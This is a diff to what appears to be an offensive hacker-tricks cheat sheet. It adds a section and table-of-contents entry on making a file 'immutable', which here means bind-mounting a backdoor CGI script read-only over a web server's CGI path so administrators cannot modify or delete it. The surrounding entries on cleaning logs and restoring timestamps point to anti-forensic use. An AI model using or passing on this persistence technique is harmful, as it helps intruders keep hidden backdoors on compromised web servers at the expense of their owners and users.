@@ -79,6 +79,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Restore the date of a file](#restore-timestamp)
    1. [Clean logfile](#shell-clean-logs)
    1. [Hide files from a User without root privileges](#shell-hide-files)
+   1. [Make a file immutable](#perm-files)
 1. [Crypto](#crypto)
    1. [Generate quick random Password](#gen-password)
    1. [Linux transportable encrypted filesystems](#crypto-filesystem)
@@ -1677,6 +1678,16 @@ Unix allows filenames with about any ASCII character but 0x00. Try tab (*\t*). H
 ```sh
 mkdir $'\t'
 cd $'\t'
+```
+
+<a id="perm-files"></a>
+**8.v. Make a file immuteable**
+
+This will redirect `/var/www/cgi/blah.cgi` to `/boot/backdoor.cgi`. The file `blah.cgi` can not be modified or removed (unless unmounted).
+```sh
+# /boot/backdoor.cgi contains our backdoor
+touch /var/www/cgi/blah.cgi
+mount -o bind,ro /boot/backdoor.cgi /var/www/cgi/blah.cgi
 ```
 
 ---
